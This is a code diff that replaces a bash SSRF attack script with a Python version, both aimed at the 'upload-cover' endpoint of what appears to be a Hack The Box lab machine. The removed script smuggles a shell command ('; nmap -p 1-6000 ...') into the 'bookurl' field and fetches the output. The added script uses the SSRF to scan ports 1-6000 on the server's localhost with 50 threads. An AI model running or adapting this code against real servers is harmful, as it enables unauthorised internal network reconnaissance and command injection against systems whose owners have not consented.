@@ -1,31 +1,28 @@
-#!/bin/bash
+import requests
+from concurrent.futures import ThreadPoolExecutor
 
-# Variables
-url="http://10.10.11.20/upload-cover"
-payload="http://127.0.0.1; nmap -p 1-6000 -sV 127.0.0.1 -oN /tmp/ssrf_scan_results.txt"
-result_url="http://10.10.11.20/tmp/ssrf_scan_results.txt"
+url = "http://editorial.htb/upload-cover"
+boundary = "boundary_value"
+expected_response = '/static/images/expected_image.jpeg'
 
-# Function to perform the SSRF attack
-perform_ssrf_attack() {
-  echo "Performing SSRF attack..."
-  response=$(curl -s -X POST "$url" \
-    -H "Host: 10.10.11.20" \
-    -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0" \
-    -H "Accept: */*" \
-    -H "Accept-Language: en-US,en;q=0.5" \
-    -H "Accept-Encoding: gzip, deflate, br" \
-    -H "Content-Type: multipart/form-data; boundary=---------------------------boundary" \
-    --data-binary $'-----------------------------boundary\r\nContent-Disposition: form-data; name="bookurl"\r\n\r\n'"$payload"$'\r\n-----------------------------boundary--')
-  echo "SSRF attack performed. Response: $response"
-}
+def make_request(port):
+    data = (
+        f'--{boundary}\r\n'
+        'Content-Disposition: form-data; name="bookurl"\r\n\r\n'
+        f'http://127.0.0.1:{port}/\r\n'
+        f'--{boundary}\r\n'
+        'Content-Disposition: form-data; name="bookfile"; filename=""\r\n'
+        'Content-Type: application/octet-stream\r\n\r\n\r\n'
+        f'--{boundary}--\r\n'
+    )
+    headers = {'Content-Type': f'multipart/form-data; boundary={boundary}'}
+    try:
+        response = requests.post(url, data=data, headers=headers)
+        if response.text != expected_response:
+            print(f'Open port found: {port}')
+    except requests.RequestException:
+        pass
 
-# Function to fetch results
-fetch_results() {
-  echo "Fetching results..."
-  results=$(curl -s "$result_url")
-  echo "Results fetched: $results"
-}
-
-# Execute the functions
-perform_ssrf_attack
-fetch_results
+if __name__ == "__main__":
+    with ThreadPoolExecutor(max_workers=50) as executor:
+        executor.map(make_request, range(1, 6001))
